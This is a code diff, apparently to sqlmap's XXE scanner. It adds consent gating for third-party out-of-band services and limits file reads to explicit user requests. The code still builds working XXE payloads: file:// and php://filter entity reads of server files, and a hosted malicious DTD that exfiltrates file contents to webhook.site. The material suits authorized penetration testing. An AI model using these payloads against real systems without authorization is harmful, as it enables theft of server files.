@@ -11,6 +11,7 @@ import time
 from lib.core.common import beep
 from lib.core.common import dataToOutFile
 from lib.core.common import randomStr
+from lib.core.common import readInput
 from lib.core.common import singleTimeWarnMessage
 from lib.core.convert import getBytes
 from lib.core.convert import getText
@@ -21,12 +22,12 @@ from lib.core.data import logger
 from lib.core.dicts import POST_HINT_CONTENT_TYPES
 from lib.core.enums import CUSTOM_LOGGING
 from lib.core.enums import HTTP_HEADER
+from lib.core.enums import HTTPMETHOD
 from lib.core.settings import ASTERISK_MARKER
 from lib.core.settings import XXE_BLACKHOLE_HOST
 from lib.core.settings import XXE_ERROR_SIGNATURES
 from lib.core.settings import XXE_HARDENED_REGEX
 from lib.core.settings import XXE_IMPACT_FILES
-from lib.core.settings import OOB_EXFIL_DEFAULT_FILE
 from lib.core.settings import OOB_POLL_ATTEMPTS
 from lib.core.settings import OOB_POLL_DELAY
 from lib.core.settings import XXE_LOCAL_DTDS
@@ -37,6 +38,14 @@ from lib.request.connect import Connect as Request
 # root:x:0:0 or similar) so it cannot collide with a WAF honeypot signature and
 # so its presence in a response is unambiguously our reflected/expanded value.
 SENTINEL = randomStr(length=12, lowercase=True)
+
+# When the user marked an explicit injection point in the body (e.g. '<n>luther*</n>'),
+# it is preserved as this placeholder and used as the SOLE injection spot, instead of
+# rewriting every node - so schema/signature/id/auth-sensitive documents stay intact.
+_MARKER = None
+
+# Cached answer to the one-time "use a public OOB service?" consent prompt (per scan).
+_OOB_CONSENT = None
 
 # First element of the document (skipping the <?xml?> prolog, comments and any
 # DOCTYPE). Its name must match the DOCTYPE name or libxml2/Xerces reject the doc.
@@ -52,13 +61,41 @@ def _looksXml(data):
     return data.startswith("<") and re.search(r"<[A-Za-z_?!]", data) is not None and '>' in data
 
 
+def _toSystemId(path):
+    """Normalise a user file path (Unix, Windows, or already a URI) to a file:// systemId,
+    consistently across every tier."""
+    p = getText(path or "").strip()
+    if "://" in p:
+        return p
+    return "file:///" + p.replace("\\", "/").lstrip("/")
+
+
+def _toResource(path):
+    """Plain absolute path for a php://filter 'resource=' argument (URI/backslashes stripped)."""
+    p = getText(path or "").strip()
+    if p.startswith("file://"):
+        p = p[len("file://"):]
+    p = p.replace("\\", "/")
+    if re.match(r"^/?[A-Za-z]:/", p):   # keep a Windows drive path as 'C:/...'
+        return p.lstrip("/")
+    return "/" + p.lstrip("/")
+
+
 def _cleanBody():
     """Return the original request body with sqlmap's injection marks removed.
     Order matters: drop the injected custom marks first (any literal '*' from the
     original body was already escaped to ASTERISK_MARKER by target processing),
     then restore those escaped asterisks."""
+    global _MARKER
+    _MARKER = None
     data = getText(conf.data or "")
-    data = data.replace(kb.customInjectionMark or "\x00", "")
+    mark = kb.customInjectionMark or "\x00"
+    if kb.get("processUserMarks") and mark in data:
+        # user chose the injection point explicitly - honour it as the SOLE spot
+        _MARKER = "xxemark%s" % randomStr(10, lowercase=True)
+        data = data.replace(mark, _MARKER, 1).replace(mark, "")
+    else:
+        data = data.replace(mark, "")
     data = data.replace(ASTERISK_MARKER, "*")
     return data.lstrip(u"\ufeff\ufffe")   # drop a leading BOM so root/DOCTYPE handling stays correct
 
@@ -85,6 +122,9 @@ def _send(body):
 
     if conf.delay:
         time.sleep(conf.delay)
+
+    if _MARKER and not isinstance(body, bytes) and _MARKER in body:
+        body = body.replace(_MARKER, "")   # strip any unreplaced placeholder before sending
 
     try:
         if conf.verbose >= 3:
@@ -132,6 +172,9 @@ def _placeRef(xml, snippet, attrs=False):
     for the external/XInclude tiers or the document becomes ill-formed). Falls back to
     injecting just before the root's closing tag when there is no text node at all."""
 
+    if _MARKER and _MARKER in xml:
+        return xml.replace(_MARKER, snippet)   # honour the user's explicit injection point
+
     start = re.search(r"\]>", xml).end() if "]>" in xml else 0
     head, tail = xml[:start], xml[start:]
     tail, count = _TEXTNODE_RE.subn(lambda _: ">" + snippet + "<", tail)
@@ -169,19 +212,25 @@ def _fingerprint(page):
 
 
 def _echoed(page):
-    """True when the response mirrors our raw markup back. Essential guard for the
-    sentinel-in-path oracles: a debug/echo endpoint that never parses XML would
-    otherwise reflect the sentinel (it is inside the body we sent) and look like a
-    genuine parser error. A real error surfaces only the path/message, not the
-    DOCTYPE/entity declarations."""
-    page = getUnicode(page or "")
-    return "<!DOCTYPE" in page or "<!ENTITY" in page
+    """True when the response mirrors our markup back (a debug/echo endpoint that
+    never parses XML). Since our sentinel lives inside the DOCTYPE/ENTITY declaration
+    we send, an echo would otherwise look like a genuine reflected/error hit. We match
+    the declaration in raw AND escaped forms (HTML-entity, decimal/hex numeric, and
+    percent-encoded) so an app that HTML-escapes or URL-encodes the reflected body is
+    still recognised as an echo regardless of whether decodePage normalised it."""
+    page = getUnicode(page or "").lower()
+    for kw in ("!doctype", "!entity"):
+        for lt in ("<", "&lt;", "&#60;", "&#x3c;", "%3c", "\\u003c"):
+            if lt + kw in page:
+                return True
+    return False
 
 
 def _report(title, payload):
     if conf.beep:
         beep()
-    conf.dumper.singleString("---\nParameter: XML body ((custom) POST)\n    Type: XXE injection\n    Title: %s\n    Payload: %s\n---" % (title, payload))
+    place = "%s XML body" % (conf.method or HTTPMETHOD.POST)
+    conf.dumper.singleString("---\nParameter: %s\n    Type: XXE injection\n    Title: %s\n    Payload: %s\n---" % (place, title, payload))
 
 
 def _dumpFileRead(remoteFile, content):
@@ -235,10 +284,9 @@ def _tryInbandFileRead(xml, rootName, fileName):
 
     from lib.core.convert import decodeBase64
 
-    resource = fileName if fileName.startswith("/") else "/" + fileName
     m1, m2 = randomStr(8, lowercase=True), randomStr(8, lowercase=True)
-    for systemId, isB64 in (("file://%s" % resource, False),
-                            ("php://filter/convert.base64-encode/resource=%s" % resource, True)):
+    for systemId, isB64 in ((_toSystemId(fileName), False),
+                            ("php://filter/convert.base64-encode/resource=%s" % _toResource(fileName), True)):
         ent = randomStr(8, lowercase=True)
         subset = '<!ENTITY %s SYSTEM "%s">' % (ent, systemId)
         payload = _placeRef(_buildDoctype(xml, rootName, subset), "%s&%s;%s" % (m1, ent, m2))
@@ -274,14 +322,14 @@ def _tryExternalFile(xml, rootName, baseline):
 
 
 def _tryPhpFilter(xml, rootName, baseline):
-    """PHP-only in-band read that survives newlines/binary: base64 a source file
-    through php://filter. Confirmed when the reflection decodes to file content."""
+    """PHP-only in-band read (base64 via php://filter). Used only as a benign in-band
+    impact demonstration -> reads /etc/os-release; it deliberately never probes
+    /etc/passwd here (a specific file is read only on explicit '--file-read')."""
 
     from lib.core.convert import decodeBase64
 
     baselineTokens = set(re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", getUnicode(baseline or "")))
-    for systemId, pattern in (("file:///etc/passwd", r":0:0:"), ("file:///etc/os-release", r"(?i)^(?:NAME|ID|VERSION)=")):
-        resource = systemId[len("file://"):]
+    for resource, pattern in (("/etc/os-release", r"(?i)^(?:NAME|ID|VERSION)="),):
         ent = randomStr(length=8, lowercase=True)
         subset = '<!ENTITY %s SYSTEM "php://filter/convert.base64-encode/resource=%s">' % (ent, resource)
         payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent)
@@ -328,22 +376,24 @@ def _tryLocalDtd(xml, rootName):
     return None, ""
 
 
-def _tryErrorExfil(xml, rootName):
+def _tryErrorExfil(xml, rootName, errorChannel=False):
     """In-band error-based file EXFILTRATION: coerce the parser into an error whose
     message embeds the target file's contents (not just a sentinel). Two vehicles:
     (a) repurpose a local on-disk DTD -> NO egress at all, or (b) a DTD we host on
-    the exfil service -> needs egress to fetch it plus verbose errors. php://filter
-    base64 carries a whole multi-line file intact; raw file:// leaks the first line
-    on any parser. Returns (content, filename) or (None, None)."""
+    the exfil service -> needs egress to fetch it plus verbose errors, so it is only
+    attempted when an error channel was already confirmed (else it is pointless and
+    just burns third-party requests). php://filter base64 carries a whole multi-line
+    file intact; raw file:// leaks the first line. Returns (content, filename)."""
 
     from lib.core.convert import decodeBase64
 
-    fileName = conf.get("fileRead") or OOB_EXFIL_DEFAULT_FILE
-    resource = fileName if fileName.startswith("/") else "/" + fileName
+    fileName = conf.get("fileRead")
+    if not fileName:
+        return None, None
     marker = randomStr(10, lowercase=True)
     # (systemId, isBase64): base64 first (whole file, PHP), raw fallback (first line, any parser)
-    reads = (("php://filter/convert.base64-encode/resource=%s" % resource, True),
-             ("file://%s" % resource, False))
+    reads = (("php://filter/convert.base64-encode/resource=%s" % _toResource(fileName), True),
+             (_toSystemId(fileName), False))
 
     def _extract(page, isB64):
         pattern = (r"file:/+%s/([A-Za-z0-9+/=]+)" if isB64 else r"file:/+%s/([^\s'\"<>;)]+)") % re.escape(marker)
@@ -368,8 +418,9 @@ def _tryErrorExfil(xml, rootName):
             if content:
                 return content, fileName
 
-    # (b) DTD we host on the exfil service - egress + verbose errors (third party)
-    if not _oobEnabled():
+    # (b) DTD we host on the exfil service - egress + verbose errors (third party):
+    # skip on a blind target (no error channel) and without explicit OOB consent
+    if not (errorChannel and _oobConsent()):
         return None, None
     from lib.request.webhooksite import WebhookSite
     wh = WebhookSite()
@@ -469,9 +520,24 @@ def _tryTimeBlind(xml, rootName):
 
 
 def _oobEnabled():
-    """Out-of-band tiers contact a public third party by default. Honour an explicit
-    opt-out (`--oob-server none`) for sensitive engagements."""
+    """False when the user opted out of OOB entirely (`--oob-server none`)."""
     return (conf.get("oobServer") or "").strip().lower() not in ("none", "off", "0", "no", "disable", "false")
+
+
+def _oobConsent():
+    """True only when the user has opted into contacting a third-party OOB service:
+    either explicitly (`--oob-server <host>`) or by answering the one-time prompt,
+    which defaults to NO - so '--batch' never silently phones a public service."""
+    global _OOB_CONSENT
+    if not _oobEnabled():
+        return False
+    if conf.get("oobServer"):
+        return True
+    if _OOB_CONSENT is None:
+        message = "do you want sqlmap to use a public out-of-band service "
+        message += "(interactsh/webhook.site) for blind XXE? [y/N] "
+        _OOB_CONSENT = readInput(message, default='N', boolean=True)
+    return _OOB_CONSENT
 
 
 def _tryOobExfil(xml, rootName):
@@ -486,17 +552,24 @@ def _tryOobExfil(xml, rootName):
     from lib.core.convert import decodeBase64
     from lib.request.webhooksite import WebhookSite
 
+    fileName = conf.get("fileRead")
+    if not fileName:
+        return None
+
     wh = WebhookSite()
     exfilToken = wh.newToken()
     if not exfilToken:
         logger.debug("out-of-band exfiltration tier skipped (could not reach the exfil service)")
         return None
 
-    target = conf.get("fileRead") or OOB_EXFIL_DEFAULT_FILE
-    exfilUrl = "%s/?x=%%file;" % wh.hostUrl(exfilToken)
+    marker = randomStr(10, lowercase=True)
+    # Carry the base64 in the URL PATH, not the query: query parsers turn '+' into a
+    # space and mangle '/'/'=', corrupting the payload. In the path those bytes survive
+    # and webhook.site logs the raw request URL, which we regex back out.
+    exfilUrl = "%s/%s/%%file;" % (wh.hostUrl(exfilToken), marker)
     dtd = ('<!ENTITY %% file SYSTEM "php://filter/convert.base64-encode/resource=%s">\n'
            '<!ENTITY %% eval "<!ENTITY &#x25; exfil SYSTEM \'%s\'>">\n'
-           '%%eval;\n%%exfil;') % (target, exfilUrl)
+           '%%eval;\n%%exfil;') % (_toResource(fileName), exfilUrl)
     dtdToken = wh.newToken(dtd)
     if not dtdToken:
         return None
@@ -506,15 +579,16 @@ def _tryOobExfil(xml, rootName):
     _send(payload)
 
     content, detected = None, False
+    pattern = re.compile(r"/%s/([A-Za-z0-9+/=]+)" % re.escape(marker))
     for _ in range(OOB_POLL_ATTEMPTS):
         time.sleep(OOB_POLL_DELAY)
         for record in wh.captured(exfilToken):
-            leaked = (record.get("query") or {}).get("x")
-            if leaked:
+            match = pattern.search(getText(record.get("url") or ""))
+            if match:
                 try:
-                    content = getText(decodeBase64(leaked))
+                    content = getText(decodeBase64(match.group(1)))
                 except Exception:
-                    content = getText(leaked)
+                    content = match.group(1)
                 break
         if content:
             break
@@ -523,7 +597,7 @@ def _tryOobExfil(xml, rootName):
 
     if not detected:
         detected = bool(wh.captured(dtdToken))
-    return {"payload": payload, "filename": target, "content": content, "detected": detected}
+    return {"payload": payload, "filename": fileName, "content": content, "detected": detected}
 
 
 def _tryOob(xml, rootName):
@@ -560,8 +634,9 @@ def _tryOob(xml, rootName):
 
 
 def xxeScan():
-    global SENTINEL
+    global SENTINEL, _OOB_CONSENT
     SENTINEL = randomStr(length=12, lowercase=True)
+    _OOB_CONSENT = None
 
     debugMsg = "'--xxe' is self-contained: it detects XML External Entity injection "
     debugMsg += "in the request body and demonstrates file-read impact. SQL enumeration "
@@ -583,29 +658,30 @@ def xxeScan():
     baseline = _send(xml)
     found = False
 
-    # T2: in-band reflected (internal entity expansion) - the strongest oracle
+    # T2: in-band reflected DTD/internal-entity expansion. This proves the parser
+    # processes entities; it is NOT yet external-entity file-read impact - so the
+    # finding is worded conservatively and escalated only if an actual read follows.
     payload, page = _tryInternal(xml, rootName, baseline)
     if payload:
         found = True
-        logger.info("the XML body is vulnerable to XXE injection (in-band, entity expansion enabled)")
-        _report("In-band (reflected internal entity)", payload)
+        logger.info("the XML body processes DTD/internal entities (in-band reflection confirmed)")
+        _report("In-band DTD/internal entity expansion", payload)
 
         if conf.get("fileRead"):
             content = _tryInbandFileRead(xml, rootName, conf.fileRead)
             if content:
-                logger.info("in-band file read of '%s' succeeded" % conf.fileRead)
+                logger.info("in-band XXE file-read impact confirmed for '%s'" % conf.fileRead)
                 _report("In-band file read ('%s')" % conf.fileRead, "<in-band reflected read of '%s'>" % conf.fileRead)
                 _dumpFileRead(conf.fileRead, content)
-
-        systemId, snippet = _tryExternalFile(xml, rootName, baseline)
-        if systemId:
-            logger.info("file-read impact confirmed via external entity ('%s'): '%s'" % (systemId, snippet))
-            _report("Out-of-band file read (external entity '%s')" % systemId, "<!ENTITY xxe SYSTEM \"%s\"> -> %s" % (systemId, snippet))
         else:
-            phpPayload = _tryPhpFilter(xml, rootName, baseline)
-            if phpPayload:
-                logger.info("file-read impact confirmed via php://filter (base64 source disclosure)")
-                _report("File read via php://filter (base64)", phpPayload)
+            # benign, in-band impact demonstration (data stays in the response, no third party)
+            systemId, snippet = _tryExternalFile(xml, rootName, baseline)
+            if not systemId:
+                snippet = _tryPhpFilter(xml, rootName, baseline)
+                systemId = "php://filter" if snippet else None
+            if systemId:
+                logger.info("in-band XXE file-read impact confirmed (external entity, e.g. '%s')" % systemId)
+                _report("In-band file-read impact (external entity '%s')" % systemId, "<external-entity read of a benign file for impact>")
 
     # T3: error-based (works where entities are not reflected but errors leak)
     errorChannel = False
@@ -626,13 +702,14 @@ def xxeScan():
             logger.info("the XML body is vulnerable to XXE injection (error-based via local-DTD repurposing, no egress required)")
             _report("Error-based (local-DTD repurposing, back-end: '%s')" % backend, payload)
 
-    # T3c: error-based FILE EXFILTRATION - upgrade a confirmed error channel to an
-    # in-band file read (or attempt it directly when the user asked via --file-read)
-    if errorChannel or conf.get("fileRead"):
-        content, fileName = _tryErrorExfil(xml, rootName)
+    # T3c: error-based FILE EXFILTRATION - only on an explicit '--file-read' request.
+    # The local-DTD vehicle is always tried (no egress); the remote-DTD vehicle needs
+    # both a confirmed error channel (pointless on a blind target) and OOB consent.
+    if conf.get("fileRead"):
+        content, fileName = _tryErrorExfil(xml, rootName, errorChannel)
         if content:
             found = True
-            logger.info("the XML body is vulnerable to XXE injection (error-based in-band file read of '%s')" % fileName)
+            logger.info("error-based in-band XXE file read of '%s' succeeded" % fileName)
             _report("Error-based in-band file read ('%s')" % fileName, "<error-based exfiltration of '%s'>" % fileName)
             _dumpFileRead(fileName, content)
 
@@ -661,27 +738,28 @@ def xxeScan():
             logger.info("the XML body is vulnerable to XXE injection (time-based blind, external entity resolution reaches out-of-band)")
             _report("Time-based blind (external entity to non-routable host)", payload)
 
-    # T7: out-of-band exfiltration via a hosted malicious DTD (also confirms blind XXE)
-    if not found and _oobEnabled():
-        exfil = _tryOobExfil(xml, rootName)
-        if exfil and (exfil["content"] or exfil["detected"]):
-            found = True
-            if exfil["content"]:
-                logger.info("the XML body is vulnerable to blind XXE injection (out-of-band file read of '%s')" % exfil["filename"])
-                _report("Out-of-band blind file read ('%s')" % exfil["filename"], exfil["payload"])
-                _dumpFileRead(exfil["filename"], exfil["content"])
-            else:
-                logger.info("the XML body is vulnerable to blind XXE injection (out-of-band, target fetched the hosted DTD)")
-                _report("Out-of-band blind (hosted-DTD callback)", exfil["payload"])
-
-    # T8: out-of-band blind confirmation via an interaction server (DNS+HTTP callback)
-    if not found and _oobEnabled():
-        result = _tryOob(xml, rootName)
-        if result:
-            payload, protocol = result
-            found = True
-            logger.info("the XML body is vulnerable to XXE injection (out-of-band, confirmed via %s interaction with the collector)" % protocol)
-            _report("Out-of-band blind (collector callback: %s)" % protocol, payload)
+    # T7: out-of-band tiers - THIRD PARTY, so only on explicit consent (default NO).
+    # Low-impact callback confirmation is the default; actual file exfiltration is
+    # attempted only when the user explicitly asked for a file via '--file-read'.
+    if not found and _oobConsent():
+        if conf.get("fileRead"):
+            exfil = _tryOobExfil(xml, rootName)
+            if exfil and (exfil["content"] or exfil["detected"]):
+                found = True
+                if exfil["content"]:
+                    logger.info("blind XXE out-of-band file read of '%s' succeeded" % exfil["filename"])
+                    _report("Out-of-band blind file read ('%s')" % exfil["filename"], exfil["payload"])
+                    _dumpFileRead(exfil["filename"], exfil["content"])
+                else:
+                    logger.info("blind XXE confirmed (out-of-band; target fetched the hosted DTD)")
+                    _report("Out-of-band blind (hosted-DTD callback)", exfil["payload"])
+        else:
+            result = _tryOob(xml, rootName)
+            if result:
+                payload, protocol = result
+                found = True
+                logger.info("blind XXE confirmed (out-of-band %s callback to the interaction server)" % protocol)
+                _report("Out-of-band blind (collector callback: %s)" % protocol, payload)
 
     if not found:
         # Reachable-but-not-exploitable diagnostics: distinguish a hardened parser
